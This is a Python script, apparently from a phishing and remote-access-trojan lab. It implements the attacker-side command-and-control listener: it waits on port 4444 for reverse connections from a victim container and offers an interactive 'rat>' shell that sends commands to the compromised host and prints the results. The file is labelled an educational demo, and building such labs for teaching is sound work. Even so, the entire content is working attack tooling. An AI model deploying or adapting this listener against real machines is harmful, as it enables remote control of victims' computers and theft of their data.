#!/usr/bin/env python3
"""
EDUCATIONAL DEMO ONLY - Attacker side (run on HOST).
Listens for reverse connections from the victim "Primary Doctor" container.
Simulates the RAT C2 (command & control) server that receives the callback
after the victim "opens" the malicious email attachment.
"""
import socket
import sys
import threading

LISTEN_PORT = 4444
LISTEN_HOST = "0.0.0.0"


def handle_client(client_socket: socket.socket, address: tuple) -> None:
    """Handle one RAT client (victim) session."""
    try:
        banner = client_socket.recv(4096).decode(errors="ignore")
        print(banner, end="")
        print(f"[*] Session from {address}. Type commands (exit to close).\n")
        while True:
            try:
                cmd = input("rat> ")
                if not cmd.strip():
                    continue
                if cmd.strip().lower() in ("exit", "quit"):
                    client_socket.sendall(cmd.encode())
                    break
                client_socket.sendall((cmd + "\n").encode())
                data = client_socket.recv(65536)
                if not data:
                    break
                print(data.decode(errors="replace"), end="")
            except EOFError:
                break
    finally:
        client_socket.close()
        print(f"[*] Session {address} closed.")


def main() -> None:
    port = int(sys.argv[1]) if len(sys.argv) > 1 else LISTEN_PORT
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, port))
    server.listen(5)
    print(f"[*] RAT listener (attacker) on 0.0.0.0:{port}")
    print("[*] Waiting for victim to open malicious email attachment...\n")
    while True:
        client, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(client, addr))
        t.daemon = True
        t.start()


if __name__ == "__main__":
    main()
